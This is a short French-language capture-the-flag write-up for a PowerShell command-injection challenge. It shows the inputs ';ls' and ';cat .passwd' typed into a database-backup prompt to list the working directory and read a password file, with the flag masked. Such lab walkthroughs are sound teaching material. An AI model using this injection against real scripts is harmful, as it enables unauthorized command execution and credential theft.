# Powershell - Command injection

## Procédure

1. Je vois que mon input est inscrit dans la réponse retour

```
Table to dump:
> test
Connect to the database With the secure Password: 76492d1116743f0423413b16050a53
45MgB8AFUASgB4AEUAYgBZAGMAUABmADkATgBJADMAZgA5ADcAMQBxADcAeAA1AFEAPQA9AHwAOQA2AD
cANQAzAGYANgA4ADYAMQAwADIANAA5ADMAYgBiAGEAZgAzAGQANwAwAGMAMgAwAGMANAAyADcAZgA0AD
QANAAwADcANABkADMAMQBjADMANAA1AGIANwA4AGMAMgBhADYAOQA2ADIAYQBiADUAMgAyAGMAMQA2AD
UAOAA1AGEANQA0AGQANAAxADIANgA1ADQAZAAyADEAMAAwADYANAA0AGQAMQAxADgAZgBmADQAMwBhAG
UAYQAwADIA. Backup the table test
```

2. Utilisation d'un caractère de sortie, pour ce cas "," 

```
Table to dump:
> ;ls
Connect to the database With the secure Password: 76492d1116743f0423413b16050a53
45MgB8AFUASgB4AEUAYgBZAGMAUABmADkATgBJADMAZgA5ADcAMQBxADcAeAA1AFEAPQA9AHwAOQA2AD
cANQAzAGYANgA4ADYAMQAwADIANAA5ADMAYgBiAGEAZgAzAGQANwAwAGMAMgAwAGMANAAyADcAZgA0AD
QANAAwADcANABkADMAMQBjADMANAA1AGIANwA4AGMAMgBhADYAOQA2ADIAYQBiADUAMgAyAGMAMQA2AD
UAOAA1AGEANQA0AGQANAAxADIANgA1ADQAZAAyADEAMAAwADYANAA0AGQAMQAxADgAZgBmADQAMwBhAG
UAYQAwADIA. Backup the table
-a----       12/12/2021   9:25 AM             43 .git
-a----       11/21/2021  11:34 AM            150 .key
-a----        4/20/2020  10:50 AM             18 .passwd
------       12/12/2021   9:50 AM            574 ._perms
------       11/21/2021  11:35 AM            348 ch18.ps1
```

## Récupération du flag

```
Table to dump:
> ;cat .passwd
Connect to the database With the secure Password: 76492d1116743f0423413b16050a53
45MgB8AFUASgB4AEUAYgBZAGMAUABmADkATgBJADMAZgA5ADcAMQBxADcAeAA1AFEAPQA9AHwAOQA2AD
cANQAzAGYANgA4ADYAMQAwADIANAA5ADMAYgBiAGEAZgAzAGQANwAwAGMAMgAwAGMANAAyADcAZgA0AD
QANAAwADcANABkADMAMQBjADMANAA1AGIANwA4AGMAMgBhADYAOQA2ADIAYQBiADUAMgAyAGMAMQA2AD
UAOAA1AGEANQA0AGQANAAxADIANgA1ADQAZAAyADEAMAAwADYANAA0AGQAMQAxADgAZgBmADQAMwBhAG
UAYQAwADIA. Backup the table
SeXXXXXXXXXssXXXXX
```